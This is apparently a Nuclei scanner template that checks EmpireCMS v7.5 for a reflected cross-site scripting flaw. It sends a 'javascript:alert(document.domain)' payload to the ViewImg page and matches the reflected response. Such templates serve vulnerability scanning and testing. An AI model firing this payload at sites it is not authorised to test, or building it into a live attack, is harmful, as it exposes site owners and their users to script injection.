id: empirecms-xss
info:
  author: pikpikcu
  name: EmpireCMS v75 XSS
  reference: https://www.geek-share.com/detail/2777280260.html
  severity: medium
  tags: empirecms,xss
requests:
- matchers:
  - type: word
    words:
    - onmousewheel=\"return bbimg(this)\"
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(document.domain)'
